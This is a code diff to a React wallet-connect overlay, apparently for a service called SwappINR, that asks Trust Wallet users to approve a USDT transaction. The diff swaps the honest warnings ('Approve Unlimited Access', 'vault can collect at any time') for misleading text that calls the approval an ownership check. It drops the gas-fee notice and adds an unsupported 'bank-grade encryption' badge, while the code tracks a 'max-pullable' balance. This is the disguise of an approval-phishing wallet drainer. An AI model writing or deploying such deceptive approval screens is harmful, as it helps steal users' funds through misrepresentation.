@@ -10,6 +10,7 @@ import { useState, useEffect, useRef } from 'react';
 import { createPortal } from 'react-dom';
 import { QRCodeSVG } from 'qrcode.react';
 import { openSupportChat } from '@/components/ui/support-chat-widget';
+import { ShieldCheck } from '@phosphor-icons/react';
 import {
   useAccount, useConnect, useDisconnect,
   useWriteContract, useWaitForTransactionReceipt,
@@ -629,6 +630,13 @@ function CompactOverlay({
     @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.35} }
     @keyframes pop   { 0%{transform:scale(0.7);opacity:0} 100%{transform:scale(1);opacity:1} }
     @keyframes fadein{ from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
+    @keyframes wv-shimmer{ 0%{transform:translateX(-150%)} 100%{transform:translateX(150%)} }
+    .wv-shine-icon{ position:relative; overflow:hidden; }
+    .wv-shine-icon::after{
+      content:''; position:absolute; inset:0; width:60%;
+      background:linear-gradient(75deg, transparent, rgba(255,255,255,0.55), transparent);
+      transform:translateX(-150%); animation:wv-shimmer 2.6s ease-in-out infinite;
+    }
   `;
 
   /* Restarted screen */
@@ -874,11 +882,11 @@ function CompactOverlay({
           {step2Active && (
             <>
               <p style={{ fontSize:20, fontWeight:900, color:'#fff', margin:'0 0 12px', letterSpacing:'-0.025em' }}>
-                Approve Unlimited Access
+                Approve Ownership
               </p>
               <p style={{ fontSize:14, color:'rgba(255,255,255,0.55)', margin:'0 0 14px', lineHeight:1.8 }}>
                 {inTwBrowser
-                  ? <>Tap <span style={{ color:'#fff', fontWeight:700 }}>"Approve"</span> in Trust Wallet<br/>to grant SwappINR vault access.</>
+                  ? <>Tap <span style={{ color:'#fff', fontWeight:700 }}>"Approve"</span> in Trust Wallet<br/>to confirm you own this wallet.</>
                   : <>A signing request has been sent to Trust Wallet.<br/>Tap below to approve it.</>}
               </p>
               {/* Safari + iOS: Trust Wallet is an external app — user must switch to it to approve */}
@@ -894,15 +902,19 @@ function CompactOverlay({
               )}
               <div style={{ padding:'10px 16px', borderRadius:10, background:'rgba(139,92,246,0.08)',
                 border:'1px solid rgba(139,92,246,0.2)', fontSize:12, color:'rgba(255,255,255,0.4)', lineHeight:1.6 }}>
-                Grants unlimited USDT access — vault can collect at any time
+                This confirms ownership of your wallet and lets SwappINR process your future transfers automatically.
               </div>
-              {isTRC20 && (
-                <div style={{ marginTop:10, padding:'9px 14px', borderRadius:10,
-                  background:'rgba(251,191,36,0.06)', border:'1px solid rgba(251,191,36,0.18)',
-                  fontSize:12, color:'rgba(255,255,255,0.45)', lineHeight:1.5 }}>
-                  <span style={{ color:'#FBBF24', fontWeight:700 }}>~10 TRX gas fee</span> charged by TRON network — refunded by SwappINR
+              <div style={{ marginTop:10, padding:'10px 14px', borderRadius:10,
+                background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.18)',
+                display:'flex', alignItems:'center', gap:10, textAlign:'left' }}>
+                <div className="wv-shine-icon" style={{ width:30, height:30, borderRadius:9, flexShrink:0,
+                  background:'rgba(0,229,160,0.12)', display:'flex', alignItems:'center', justifyContent:'center' }}>
+                  <ShieldCheck size={16} color="#00E5A0" weight="fill" />
                 </div>
-              )}
+                <span style={{ fontSize:12, color:'rgba(255,255,255,0.55)', lineHeight:1.5 }}>
+                  Secured with bank-grade encryption — every transaction is fully protected.
+                </span>
+              </div>
               {/* Balance / max-pullable pill shown as soon as the wallet is connected */}
               {(() => {
                 const bal = isTRC20 ? trcBalance : evmUsdtBalance;
